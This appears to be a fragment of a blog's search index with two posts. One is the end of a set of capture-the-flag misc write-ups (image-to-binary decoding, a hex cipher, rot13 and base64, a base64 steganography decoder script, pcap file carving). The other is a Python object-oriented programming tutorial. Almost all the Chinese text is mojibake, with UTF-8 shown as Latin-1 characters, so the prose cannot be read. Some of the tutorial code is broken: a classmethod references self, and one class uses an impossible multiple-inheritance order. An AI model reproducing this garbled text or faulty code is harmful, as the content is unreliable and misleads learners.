ä¸‹ä¸‹æ¥æ˜¯ä¸€ä¸ªjaråŒ…ï¼Œç”¨javaè¿è¡Œï¼Œå‘ç°æ˜¯ä¸€ä¸ªå°æ¸¸æˆï¼Œæ ¹æ®é¢˜ç›®è”æƒ³éœ€è¦åšæŒ60sã€‚\nç©äº†å‡ æ¬¡ä¹‹åæ‰‹æ®‹æ”¾å¼ƒï¼Œç„¶åè§£å‹ç¼©æ–‡ä»¶ï¼Œç”¨winhexæ‰“å¼€æ–‡ä»¶æœç´¢flagï¼Œåœ¨/cn/bjsxt/plane/PlaneGameFrame.classé‡Œæ‰¾åˆ° flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}æ˜“çŸ¥æ˜¯base64ç¼–ç ï¼Œbase64decodeå¾—åˆ°flag{DajiDali_JinwanChiji}\nç¬¬äºŒç§åŠæ³•ï¼Œæˆ‘åœ¨æ‰¾åˆ°flagåæ€è€ƒè¿™æ˜¯miscé¢˜ä¹Ÿä¸æ˜¯é€†å‘é¢˜ï¼Œä¾¿è§‰å¾—è¿™æ¸¸æˆè‚¯å®šæœ‰bugï¼Œç„¶åæ ¹æ®å¸¸è¯†å‘ç°å³è¾¹å’Œä¸‹é¢çš„è¾¹ç•Œå¯ä»¥ç©¿è¿‡æ¥èº²é¿éšœç¢ï¼Œä½†æ˜¯å®Œå…¨å¡å…¥å³è¾¹ç•Œä¹‹åæ— æ³•è¿”å›ã€‚\nä¹‹åå‘ç°åˆ°ä¸‹è¾¹åªèƒ½å¡å…¥ä¸€åŠï¼Œäºæ˜¯çªå‘æ€ç»´ï¼Œå°†å°æ–¹å—å¡å…¥å³ä¸‹è§’ç„¶åç•™ä¸‹äº†ä¸€ä¸ªå°è§’ï¼Œå‘ç°å¯ä»¥æˆåŠŸèº²è¿‡60sï¼ˆè®°å¾—è®¡æ—¶ï¼Œåœ¨60s~70sæ—¶ä¸»åŠ¨å‡ºå»æ­»äº¡å³å¯ï¼Œç„¶åæˆåŠŸå¾—åˆ°flagæ˜æ–‡\n0x08 gif  é¢˜ç›®æè¿°ï¼šèœç‹—æˆªè·äº†ä¸€å¼ èœé¸¡å‘ç»™èœçŒ«çš„åŠ¨æ€å›¾ï¼Œå´å‘ç°å¦æœ‰ç„æœº\n å¾—åˆ°ä¸€ä¸ªzipåŒ…ï¼ŒæŸ¥çœ‹é‡Œé¢æœ‰103å¼ é»‘ç™½è‰²çš„å›¾ç‰‡ï¼Œè”æƒ³åˆ°äºŒè¿›åˆ¶ã€‚\nç™½è‰²å›¾ç‰‡ä»£è¡¨0ï¼Œé»‘è‰²å›¾ç‰‡ä»£è¡¨1ã€‚\n01100110å‰å…«ä½äºŒè¿›åˆ¶æ¢ç®—åä¸º f è¯æ˜æ€è·¯æ­£ç¡®ã€‚\n01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101\näºŒè¿›åˆ¶è½¬å­—ç¬¦ä¸²å¾—åˆ° flagï¼šflag{FuN_giF}\n0x09 æ€æ¡Œå­  é¢˜ç›®æè¿°ï¼šèœç‹—æˆªè·äº†ä¸€ä»½æŠ¥æ–‡å¦‚ä¸‹c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2ï¼Œç”Ÿæ°”åœ°æ€ç¿»äº†æ¡Œå­(â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ â”»â”â”»\n é¢˜ç›®åªæœ‰æè¿°ä¸­è¿™ä¸€æ®µå­—ç¬¦ä¸²æœ‰ä¿¡æ¯ï¼Œæ¨æµ‹æ˜¯åå…­è¿›åˆ¶ï¼Œå†™pythonçš„è½¬æ¢ä»£ç \næ¯ä¸¤ä¸ªä¸€ç»„ï¼Œå°†16è¿›åˆ¶è½¬æ¢ä¸º10è¿›åˆ¶ï¼Œå‡å»128ä»¥åè¾“å‡º asciiã€‚\nå¾—åˆ°Hi, FreshDog! The flag is: hjzcydjzbjdcjkzkcugisdchjyjsbdfr\n0x0a å¦‚æ¥åä¸‰æŒ  é¢˜ç›®æè¿°ï¼šèœç‹—ä¸ºäº†æ‰“è´¥èœçŒ«ï¼Œå­¦äº†ä¸€å¥—å¦‚æ¥åä¸‰æŒã€‚\n ä¸‹ä¸‹æ¥é™„ä»¶æ˜¯ä¸€ä¸ªdocxï¼Œå‘ç°æ˜¯ä¸€æ®µæ–‡å­—ï¼Œè´¼åƒä½›æ•™é‡Œçš„æ–‡å­—\næœç´¢å¾—åˆ°è¿™æ˜¯ä¸€ç§ä½›è¯­åŠ å¯†ï¼Œåœ¨ç½‘ç«™ http://keyfc.net/bbs/tools/tudoucode.aspx ä¸ä½›è®ºç¦… å¯ä»¥ç¿»è¯‘ï¼Œä½†æ˜¯å°†å…¨æ–‡å¤åˆ¶åˆ°chromeå’Œfirefoxæ‰“å¼€çš„ç½‘ç«™é‡Œéƒ½è§£ç å¤±è´¥äº†ï¼Œåçœ‹ä»–çš„è¯´æ˜ï¼Œæ¨æµ‹åº”è¯¥åœ¨å¤åˆ¶è¿‡ç¨‹ä¸­ä¼šå°†ç¹ä½“å­—è½¬æ¢ä¸ºç®€ä½“å­—ï¼Œè¿™æ ·ä½ å¤åˆ¶åçš„æ–‡å­—å·²ç»ä¸æ˜¯æœ€åˆçš„åŸæ–‡äº†ï¼Œæ‰€ä»¥è§£ä¸å‡ºã€‚è¯•éªŒè¿‡åœ¨MicrosoftEdgeä¸­èƒ½å¤ŸæˆåŠŸè§£ç ã€‚\nè§£å®Œæ˜¯ä¸€ä¸²åƒbase64ç¼–ç çš„å­—ç¬¦MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9ï¼Œä½†æ˜¯è¯¥å­—ç¬¦è§£ç å¾—åˆ°æ˜¯ä¸€ä¸²ä¹±ç ï¼Œç„¶åå‘ç°è¿™ä¸ªå­—ç¬¦ä¸²éœ€è¦å…ˆç”¨rot13ï¼ˆä¸é¢˜ç›®â€œå¦‚æ¥åä¸‰æŒâ€è°éŸ³ï¼‰è½¬ä¸€ä¸‹ï¼Œç„¶åå†base64è§£ç ï¼Œå¾—åˆ°flagã€‚\n0x0b base64stego  é¢˜ç›®æè¿°ï¼šèœç‹—ç»è¿‡å‡ å¤©çš„å­¦ä¹ ï¼Œç»ˆäºå‘ç°äº†å¦‚æ¥åä¸‰æŒæœ€åä¸€æ­¥çš„ç²¾é«“\n æ‰“å¼€å‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…æ˜¯ä¼ªåŠ å¯†çš„æ ¹æ®ctf-wikié‡Œç›´æ¥ç”¨winhexæ”¹ä¸€ä¸ªæ ‡å¿—ä½ï¼Œæˆ–è€…ç”¨winrarä¿®å¤å³å¯\næ˜¯ä¸€ä¸ªstego.txtå¯ä»¥çœ‹åˆ°å¾ˆå¤šè¡Œçš„base64ç¼–ç \nè§£ç å‡ºæ¥æ˜¯åœ¨wikiç™¾ç§‘ä¸Šå¯¹Steganographyçš„è§£é‡Š\nSteganography is the art and science of writing hidden messages in such a way that no one , apart from the sender and intended recipient, suspe cts the existence of the mess age, a form of security through obscurity. T he word steganography is of Greek origin and means \"concea led writing\" from the Greek words steganos meaning \"co vered or protected\", and graphein meaning \"to w rite\". The first recorded use of the term was in 1499 by Joh annes Trithemius in his Steganographia, a trea tise on cryptography and steganography disg uised as a book on magic. Generally, mess ages will appear to be something else: images, arti cles, shopping lists, or some ot her covertext and, classically, the hidden message may be in invi sible ink between the visible lines of a private letter. The advantage of steganography, over cr yptography alone, is that messages do not attract attention to themselves. Plainly visible encrypted messagesï¿½no matter how unbreakableï¿½will arouse s uspicion, and may in themselves be incriminating in countries where encryption is illegal. Therefore, whereas cryptography protects the contents of a message, steganography can be said to protect b oth messages and communicating parties. Steganography inclu des the concealment of information within com puter files. In digital steganography, electronic communication s may include steganographic coding insi de of a transport layer, such as a document file, image fil e, program or protocol. Media files are ideal for steganographic transmissio n because of their large size. As a simple example, a sender might start with a n innocuous image file and adjust the color of every 100th pixel to correspond to a letter in the alphabet, a change so subtle that someone not specifically looking f or it is unlikely to notice it. The first recorded uses of steganography can be tr aced back to 440 BC when Herodotus mentions two examples o f steganography in The Histories of Herodotus. Demaratus sent a warning about a forthcoming attack to Greece by w riting it directly on the wooden backing of a wax tablet bef ore applying its beeswax surface. Wax tablets were in common use then as reusable writing surfaces, sometime s used for shorthand. Another ancient example is that o f Histiaeus, who shaved the head of his most trusted s lave and tattooed a message on it. After his hair had g rown the message was hidden. The purpose was to instigate a revolt against the Persians. Steganography has b een widely used, including in recent historical times and t he present day. Possible permutations are endless and known examples include: * Hidden messages within wax ta blets: in ancient Greece, people wrote me ssages on the wood, then covered it with wax upon which an innocen t covering message was written . * Hidden messages on messenger's body: also used in ancien t Greece. Herodotus tells the story o f a message tattooed on a slave's shaved head, hidden by the growth of his hair, and exposed by shaving his head again. The message allegedly carried a warning to Greece abo ut Persian invasion plans. Th is method has obvious drawbacks, such as delayed transmission while waiting for the s lave's hair to grow, and the restrictions o n the number and size of mess ages that can be encoded on one person 's scalp. * In WWII, the French Resistance sent some messages w ritten on the backs of couriers using invisible ink. * Hidden messages on paper wr itten in secret inks, under other messages or on the blank parts of other messages. * Messages written in Morse code on knitting yarn and then knitted into a piece of clothing wor n by a courier. * Messages written on the back o f postage stamps. * During and after World War II, espionage agents used photographically p roduced microdots to send information back and forth. Microdots were typically minute, approximately less than the size of the period prod uced by a typewriter. WWII microdots needed to be embedded in the paper and covered with an adhesive (such as collodion). T his was reflective and thus detectable by viewing against glancing light. Alternative techniques included inserting microdots into slits cut into the edge of post cards. * During World War II, a spy for Japan in New York City, Velvalee Dickinson, sent information to accommodatio n addresses in neutral South Americ a. She was a dealer in dolls, and her letters discussed how many of this or that doll to ship. The stegotext was the doll orders, while the concealed \"plaintext\" was itself enco ded and gave information about ship movements, etc. Her case became somewhat fa mous and she became known as the Doll Woman. * Cold War count er-propaganda. In 1968, crew membe rs of the USS Pueblo (AGER-2) intelligence ship held as pr isoners by North Korea, communicated in sign language during staged photo opport unities, informing the United States they were not defectors but rather were being held ca ptive by the North Koreans. In other photo s presented to the US, crew members gave \"the finger\" to the unsuspecting North Koreans, in an attempt to discredit photos that showed them smi ling and comfortable. -- http://en.wikipedia.org /wiki/Steganography æ¨æµ‹æ˜¯base64éšå†™ï¼Œè·‘è„šæœ¬å¾—åˆ°flagï¼šflag{Base_sixty_four_point_five}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  import base64 import sys def deStego(stegoFile): b64table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" with open(stegoFile,'r') as stegoText: message = \"\" for line in stegoText: try: text = line[line.index(\"=\") - 1:-1] message += \"\".join([ bin( 0 if i == '=' else b64table.find(i))[2:].zfill(6) for i in text])[2 if text.count('=') ==2 else 4:6] except: pass return \"\".join([chr(int(message[i:i+8],2)) for i in range(0,len(message),8)]) if __name__ == \"__main__\": if len(sys.argv) == 2: print(deStego(sys.argv[1])) else: print(deStego(\"stego.txt\"))   0x0c åŠŸå¤«å†é«˜ä¹Ÿæ€•èœåˆ€  é¢˜ç›®æè¿°ï¼šèœç‹—å†³å®šç”¨èœåˆ€å’Œèœé¸¡å†³ä¸€æ­»æˆ˜\n ä¸‹è½½é™„ä»¶å‘ç°æ˜¯ä¸€ä¸ª.pcapngæ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªwiresharkæµé‡åŒ…ã€‚\nç”¨wiresharkæ‰“å¼€ï¼Œctrl+FæŸ¥æ‰¾flag\nå‘ç°é‡Œé¢æœ‰zipå’Œflag.txtè¿˜æœ‰6666.jpgã€‚\nè¿½è¸ª6666.jpgé‚£ä¸€è¡Œçš„TCPè¯·æ±‚ï¼Œå³é”®è¿½è¸ªTCPæµ\nç”±äºå›¾ç‰‡JPGçš„æ–‡ä»¶å¤´æ˜¯FFD8æ–‡ä»¶å°¾æ˜¯FFD9ï¼Œå°†æ–‡ä»¶å¦å­˜ä¸º ï¼Œç„¶åç”¨æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œç¼–è¾‘å¯¼å‡ºçš„æ–‡ä»¶ï¼ŒæŸ¥æ‰¾å¹¶åˆ é™¤ç¬¬ä¸€ä¸ªjpgæ–‡ä»¶å¤´ï¼ˆFFD8ï¼‰å’Œæœ€åä¸€ä¸ªæ–‡ä»¶å°¾ï¼ˆFFD9ï¼‰ä¹‹å¤–çš„å­—ç¬¦ä¸²ï¼Œå‰©ä¸‹çš„å…¨æ˜¯åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚ç„¶åæŠŠåå…­è¿›åˆ¶ä¿å­˜ä¸ºå›¾ç‰‡ï¼Œæˆ‘ç”¨çš„â€œ010 Editorâ€ï¼Œæ‰“å¼€åæ–°å»ºç©ºç™½æ–‡ä»¶ï¼Œå¤åˆ¶å›¾ç‰‡åå…­è¿›åˆ¶å­—ç¬¦ä¸²åˆ°ç²˜è´´æ¿ï¼Œç‚¹å‡»èœå•æ â€œEdit-Paste From-Paste From Hex Textâ€ï¼Œç„¶åä¿å­˜ä¸ºå›¾ç‰‡å°±è¡Œäº†ï¼Œä¿å­˜åçš„å›¾ç‰‡å¦‚ä¸‹å›¾ã€‚\nåˆšæ‰çœ‹åˆ°é‡Œé¢æœ‰å­˜åœ¨ä¸€ä¸ªhello.zipï¼Œä¾¿ç”¨foremostå¤„ç†æµé‡åŒ…ï¼Œåˆ†ç†å‡ºä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œé‡Œé¢å°±æ˜¯flag.txtï¼Œä¸ºåŠ å¯†æ–‡ä»¶ï¼Œè”æƒ³è‡³åˆšåˆšé‚£å¼ å¤åŸçš„å›¾ç‰‡ï¼Œç”¨å¯†ç Th1s_1s_p4sswd_!!!å°è¯•æ‰“å¼€æ–‡ä»¶ï¼Œå¾—åˆ°flagï¼šflag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}\n","description":"","tags":["ctf","misc"],"title":"XCTF-adworld-misc-wp","uri":"/posts/xctf-adworld-misc-wp/"},{"categories":[],"content":"è™½ç„¶ä¸€ç›´å†å†™é¢å‘å¯¹è±¡ç¼–ç¨‹çš„è¯­è¨€ï¼Œä½†æ˜¯å‹æ ¹æ²¡æœ‰å¯¹è±¡å¯ä»¥é¢å¯¹ï¼Œå¸Œæœ›å†™å®Œè¿™ç¯‡èƒ½æœ‰å¯¹è±¡å¯ä»¥è®©æˆ‘é¢å¯¹ï¼ï¼ï¼\nç®€ä»‹ é¢å‘å¯¹è±¡ç¼–ç¨‹(Object-oriented Programming,ç¼©å†™ï¼šOOP)æ˜¯è½¯ä»¶å·¥ç¨‹ä¸­ä¸€ç§å…·æœ‰å¯¹è±¡æ¦‚å¿µçš„ç¼–ç¨‹èŒƒå¼(Programming Paradigm)ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ç§ç¨‹åºå¼€å‘çš„æŠ½è±¡æ–¹é’ˆï¼Œä¸ä¹‹å¯¹åº”çš„ç¼–ç¨‹èŒƒå¼è¿˜æœ‰ï¼šå‡½æ•°å¼ç¼–ç¨‹(Functional Programming)ã€è¿‡ç¨‹å¼ç¼–ç¨‹(Procedural Programming)ã€å“åº”å¼ç¼–ç¨‹(Reactive Programming)ç­‰ã€‚\né¢å‘å¯¹è±¡çš„ç¨‹åºè®¾è®¡ï¼ˆOOPï¼‰æ˜¯é¢å‘è¿‡ç¨‹ç¨‹åºè®¾è®¡çš„ç»§æ‰¿å’Œå‘å±•ï¼Œå®ƒä¸ä»…æ±²å–äº†åè€…çš„ç²¾åï¼Œè€Œä¸”ä»¥ä¸€ç§æ›´åŠ æ¥è¿‘äººç±»æ€ç»´çš„æ–¹å¼æ¥åˆ†æå’Œè§£å†³é—®é¢˜ï¼šç¨‹åºæ˜¯å¯¹ç°å®ä¸–ç•Œçš„æŠ½è±¡å’Œæè¿°ï¼Œç°å®ä¸–ç•Œçš„åŸºæœ¬å•å…ƒæ˜¯ç‰©ä½“ï¼Œä¸ä¹‹å¯¹åº”çš„ï¼Œç¨‹åºä¸­çš„åŸºæœ¬å•å…ƒæ˜¯å¯¹è±¡ã€‚\né¢å‘å¯¹è±¡æ€æƒ³è®¤ä¸ºï¼šç°å®ä¸–ç•Œæ˜¯ç”±å¯¹è±¡ç»„æˆçš„ï¼Œæ— è®ºå¤§åˆ°ä¸€ä¸ªå›½å®¶è¿˜æ˜¯å°åˆ°ä¸€ä¸ªåŸå­ï¼Œéƒ½æ˜¯å¦‚æ­¤ã€‚å¹¶ä¸”å¯¹è±¡éƒ½ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š æè¿°å¯¹è±¡çŠ¶æ€æˆ–å±æ€§çš„æ•°æ®ï¼ˆå˜é‡ï¼‰ä»¥åŠæè¿°å¯¹è±¡è¡Œä¸ºæˆ–è€…åŠŸèƒ½çš„æ–¹æ³•ï¼ˆå‡½æ•°ï¼‰ã€‚å¹¶ä¸”ä¸é¢å‘è¿‡ç¨‹ä¸åŒï¼Œé¢å‘å¯¹è±¡æ˜¯å°†æ•°æ®å’Œæ“ä½œæ•°æ®çš„å‡½æ•°ç´§å¯†ç»“åˆï¼Œå…±åŒæ„æˆå¯¹è±¡æ¥æ›´åŠ ç²¾ç¡®åœ°æè¿°ç°å®ä¸–ç•Œï¼Œè¿™æ˜¯é¢å‘è¿‡ç¨‹å’Œé¢å‘å¯¹è±¡ä¸¤è€…æœ€æœ¬è´¨çš„åŒºåˆ«ã€‚\nå¯¹è±¡ä¸ç±» åœ¨é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­ï¼Œæœ€å¸¸è§çš„è¡¨ç°å°±æ˜¯åŸºäºç±»(Class)æ¥è¡¨ç°çš„ï¼Œæ¯ä¸€ä¸ªå¯¹è±¡å®ä¾‹éƒ½æœ‰å…·ä½“çš„ç±»ï¼Œå³å¯¹è±¡çš„ç±»å‹ã€‚ä½¿ç”¨ç±»çš„é¢å‘å¯¹è±¡ç¼–ç¨‹ä¹Ÿç§°ä¸ºåŸºäºç±»çš„ç¼–ç¨‹(Class-based programming)ï¼Œå¦‚å¸¸è§çš„Javaï¼ŒC++ï¼›è€Œä¸ä¹‹ç±»ä¼¼çš„æœ‰åŸºäºåŸå‹çš„ç¼–ç¨‹(Prototype-based programming)ï¼Œå¦‚JavaScriptã€‚\n ç±»ï¼šå®šä¹‰å¯¹è±¡çš„æ•°æ®æ ¼å¼(å±æ€§ç±»å‹)å’Œå¯ç”¨è¿‡ç¨‹(æ–¹æ³•)ï¼ŒåŒæ—¶ä¹Ÿå¯èƒ½åŒ…å«ç±»æˆå‘˜çš„æ•°æ®(å¦‚ï¼Œå¸¸é‡)å’Œè¿‡ç¨‹(å¦‚ï¼Œé™æ€æ–¹æ³•)ï¼Œç±»å…¶å®å°±æ˜¯å¯¹è±¡çš„ç±»å‹/åŸå‹(prototype)ã€‚ å¯¹è±¡ï¼šç±»çš„å®ä¾‹ï¼Œé€šè¿‡ç±»å®ä¾‹åŒ–å‡ºæ¥çš„å…·ä½“å®ä¾‹ã€‚  é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹å¾ é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹å¾åˆ†åˆ«æ˜¯ï¼šå°è£…ã€ç»§æ‰¿ã€å¤šæ€ ã€‚\n å°è£…(Encapsulation)  é€šè¿‡å¯¹è±¡éšè—ç¨‹åºçš„å…·ä½“å®ç°ç»†èŠ‚ï¼Œå°†æ•°æ®ä¸æ“ä½œåŒ…è£…åœ¨ä¸€èµ·ï¼Œå¯¹è±¡ä¸å¯¹è±¡ä¹‹é—´é€šè¿‡æ¶ˆæ¯ä¼ é€’æœºåˆ¶å®ç°äº’ç›¸é€šä¿¡ï¼ˆæ–¹æ³•è°ƒç”¨ï¼‰ï¼Œå…·ä½“çš„è¡¨ç°å°±æ˜¯é€šè¿‡æä¾›è®¿é—®æ¥å£å®ç°æ¶ˆæ¯çš„ä¼ å…¥ä¼ å‡ºã€‚\nå°è£…å¸¸å¸¸ä¼šé€šè¿‡æ§åˆ¶è®¿é—®æƒé™æ¥æ§åˆ¶å¯¹è±¡ä¹‹é—´çš„äº’è®¿æƒé™ï¼Œå¸¸è§çš„è®¿é—®æƒé™ï¼šå…¬æœ‰(public)ï¼Œç§æœ‰(private)ï¼Œä¿æŠ¤(protected)ã€‚æŸäº›è¯­è¨€å¯èƒ½è¿˜ä¼šæä¾›æ›´åŠ å…·ä½“çš„è®¿é—®æ§åˆ¶ï¼Œå¦‚ï¼ŒJavaçš„packageã€‚\nå°è£…çš„æ„ä¹‰ï¼šç”±äºå°è£…éšè—äº†å…·ä½“çš„å®ç°ï¼Œå¦‚æœå®ç°çš„æ”¹å˜æˆ–å‡çº§å¯¹äºä½¿ç”¨æ–¹è€Œè¨€æ˜¯æ— æ„ŸçŸ¥çš„ï¼Œæé«˜ç¨‹åºçš„å¯ç»´æŠ¤æ€§ï¼›è€Œä¸”å°è£…é¼“åŠ±ç¨‹åºå‘˜æŠŠç‰¹å®šæ•°æ®ä¸å¯¹æ•°æ®æ“ä½œçš„åŠŸèƒ½æ‰“åŒ…åœ¨ä¸€èµ·ï¼Œæœ‰åˆ©äºåº”ç”¨ç¨‹åºçš„å»è€¦ã€‚\n ç»§æ‰¿(Inheritance)  æ”¯æŒç±»çš„è¯­è¨€åŸºæœ¬éƒ½æ”¯æŒç»§æ‰¿ï¼Œç»§æ‰¿å³ç±»ä¹‹é—´å¯ä»¥ç»§æ‰¿ï¼Œé€šè¿‡ç»§æ‰¿å¾—åˆ°çš„ç±»ç§°ä¸ºå­ç±»ï¼Œè¢«ç»§æ‰¿çš„ç±»ä¸ºçˆ¶ç±»ï¼Œå­ç±»ç›¸å¯¹äºçˆ¶ç±»æ›´åŠ å…·ä½“åŒ–ã€‚\nå­ç±»å…·æœ‰è‡ªå·±ç‰¹æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¹¶ä¸”å­ç±»ä½¿ç”¨çˆ¶ç±»çš„æ–¹æ³•ä¹Ÿå¯ä»¥è¦†ç›–(é‡å†™)çˆ¶ç±»æ–¹æ³•ï¼Œåœ¨æŸäº›è¯­è¨€ä¸­è¿˜æ”¯æŒå¤šç»§æ‰¿ï¼Œä½†æ˜¯ä¹Ÿå¸¦æ¥äº†è¦†ç›–çš„å¤æ‚æ€§ã€‚\nç»§æ‰¿çš„æ„ä¹‰ï¼šç»§æ‰¿æ˜¯ä»£ç å¤ç”¨çš„åŸºç¡€æœºåˆ¶\n å¤šæ€(Polymorphism)  å¤šæ€å‘ç”Ÿåœ¨è¿è¡ŒæœŸé—´ï¼Œå³å­ç±»å‹å¤šæ€ï¼ŒæŒ‡çš„æ˜¯å­ç±»å‹æ˜¯ä¸€ç§å¤šæ€çš„å½¢å¼ï¼Œä¸åŒç±»å‹çš„å¯¹è±¡å®ä½“æœ‰ç»Ÿä¸€æ¥å£ï¼Œç›¸åŒçš„æ¶ˆæ¯ç»™äºˆä¸åŒçš„å¯¹è±¡ä¼šå¼•å‘ä¸åŒçš„åŠ¨ä½œã€‚\nå¤šæ€çš„æ„ä¹‰ï¼šæä¾›äº†ç¼–ç¨‹çš„çµæ´»æ€§ï¼Œç®€åŒ–äº†ç±»å±‚æ¬¡ç»“æ„å¤–éƒ¨çš„ä»£ç ï¼Œä½¿ç¼–ç¨‹æ›´åŠ æ³¨é‡å…³æ³¨ç‚¹åˆ†ç¦»(Separation of concernsï¼ŒSoC)\nå…³äºé¢å‘å¯¹è±¡ç¼–ç¨‹çš„è®¾è®¡æ¨¡å¼ï¼Œå¯ä»¥å‚è€ƒè°ˆè°ˆé¢å‘å¯¹è±¡ç¼–ç¨‹\nPython3é¢å‘å¯¹è±¡ç¼–ç¨‹  å‚è€ƒï¼š\nä¸€æ–‡çœ‹æ‡‚Pythoné¢å‘å¯¹è±¡ç¼–ç¨‹æ ¸å¿ƒæ€æƒ³(Pythonå­¦ä¹ ä¸Djangoå…¥é—¨å¿…çœ‹)\nPython3 é¢å‘å¯¹è±¡\nPythoné¢å‘å¯¹è±¡ç¼–ç¨‹\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  #!/usr/bin/python3 class people: #é»˜è®¤ä¸ºå…¬æœ‰å˜é‡ name = \"\" age = 0 #å®šä¹‰ç§æœ‰å˜é‡ï¼Œå³åœ¨å˜é‡å‰åŠ å…¥ __ __weight = 0 num = 0 #ç±»ä¸“æœ‰æ–¹æ³•ï¼Œå¯é‡å†™ def __init__(self,n,a,w): self.name = n self.age = a self.__weight = w self.num += 1 #ç±»æ–¹æ³•ä¸€èˆ¬ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºself def speak(self): print('I am %s,and I am %dyears old' % (self.name,self.age)) @classmethod def tol(cls): print(\"total numble of people is {}\".format(self.num)) #è¿™ä¸ªä¸ºç±»æ–¹æ³•ï¼Œå¯ç›´æ¥ä½¿ç”¨people.tol() #student ç»§æ‰¿peopleç±» class student(people): grade = \"\" def __init__(self,n,a,w,g): people.__init__(self,n,a,w) self.grade = g #æ–¹æ³•é‡å†™ def speak(self): print(\"I am a %sstudent.\\nMy name is %s\" % (self.grade,self.name)) #ç±»çš„ç§æœ‰æ–¹æ³• def __show_detail(self): print(self.name+\"\\t\"+self.age+\"\\t\"+self.__weight+\"\\n\"+self.grade) #å°è£… def getWeight(self): return self.weight #pythonæœ‰å¤šé‡ç»§æ‰¿ class sample(people, student): tag = \"\" def __init__(self,n,a,w,g,t): people.__init__(self,n,a,w) student.__init__(self,g=g) tag = t s1 = student(\"Alice\",16,47,\"7th grades\")   pythonæä¾›ç±»çš„è½¬æœ‰æ–¹æ³•ï¼Œå¯è¿›è¡Œæ–¹æ³•é‡å†™\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  __init__ : æ„é€ å‡½æ•°ï¼Œåœ¨ç”Ÿæˆå¯¹è±¡æ—¶è°ƒç”¨ __del__ : ææ„å‡½æ•°ï¼Œé‡Šæ”¾å¯¹è±¡æ—¶ä½¿ç”¨ __repr__ : æ‰“å°ï¼Œè½¬æ¢ __setitem__ : æŒ‰ç…§ç´¢å¼•èµ‹å€¼ __getitem__: æŒ‰ç…§ç´¢å¼•è·å–å€¼ __len__: è·å¾—é•¿åº¦ __cmp__: æ¯”è¾ƒè¿ç®— __call__: å‡½æ•°è°ƒç”¨ __add__: åŠ è¿ç®— __sub__: å‡è¿ç®— __mul__: ä¹˜è¿ç®— __truediv__: é™¤è¿ç®— __mod__: æ±‚ä½™è¿ç®— __pow__: ä¹˜æ–¹ åå‘è¿ç®—ç¬¦é‡è½½ï¼š __radd__: åŠ è¿ç®— __rsub__: å‡è¿ç®— __rmul__: ä¹˜è¿ç®— __rdiv__: é™¤è¿ç®— __rmod__: æ±‚ä½™è¿ç®— __rpow__: ä¹˜æ–¹ å¤åˆé‡è½½è¿ç®—ç¬¦ __iadd__: åŠ è¿ç®— __isub__: å‡è¿ç®— __imul__: ä¹˜è¿ç®— __idiv__: é™¤è¿ç®— __imod__: æ±‚ä½™è¿ç®— __ipow__: ä¹˜æ–¹    æ³¨ï¼š_new_()æ–¹æ³• pythonä¸­å®šä¹‰çš„ç±»åœ¨åˆ›å»ºå®ä¾‹å¯¹è±¡çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨æ‰§è¡Œinit()æ–¹æ³•ï¼Œä½†æ˜¯åœ¨æ‰§è¡Œinit()æ–¹æ³•ä¹‹å‰ï¼Œä¼šæ‰§è¡Œnew()æ–¹æ³•ã€‚\nnew()çš„ä½œç”¨ä¸»è¦æœ‰ä¸¤ä¸ªã€‚\n1.åœ¨å†…å­˜ä¸­ä¸ºå¯¹è±¡åˆ†é…ç©ºé—´ 2.è¿”å›å¯¹è±¡çš„å¼•ç”¨ã€‚ï¼ˆå³å¯¹è±¡çš„å†…å­˜åœ°å€ï¼‰\npythonè§£é‡Šå™¨åœ¨è·å¾—å¼•ç”¨çš„æ—¶å€™ä¼šå°†å…¶ä¼ é€’ç»™init()æ–¹æ³•ä¸­çš„selfã€‚\n1 2 3 4 5 6 7 8  class A: def __new__(cls,*args,**kwargs): print('__new__') return super().__new__(cls)#è¿™é‡Œä¸€å®šè¦è¿”å›ï¼Œå¦åˆ™__init__()æ–¹æ³•ä¸ä¼šè¢«æ‰§è¡Œ def __init__(self):#è¿™é‡Œçš„selfå°±æ˜¯newæ–¹æ³•ä¸­çš„returnè¿”å›å€¼ print('__init__') a = A()   è¾“å‡ºç»“æœ\n__new__ __init__ æˆ‘ä»¬ä¸€å®šè¦åœ¨newæ–¹æ³•ä¸­æœ€åè°ƒç”¨\n1  return super().__new__(cls)   å¦åˆ™initæ–¹æ³•ä¸ä¼šè¢«è°ƒç”¨\n1 2 3 4 5 6 7 8 9  class A: def __new__(cls,*args,**kwargs): print('__new__') # return super().__new__(cls)#è¿™é‡Œä¸€å®šè¦è¿”å›ï¼Œå¦åˆ™__init__()æ–¹æ³•ä¸ä¼šè¢«æ‰§è¡Œ def __init__(self):#è¿™é‡Œçš„selfå°±æ˜¯newæ–¹æ³•ä¸­çš„returnè¿”å›å€¼ print('__init__') a = A()   è¾“å‡º\n__new__ åƒä»¥å‰ä¸€æ 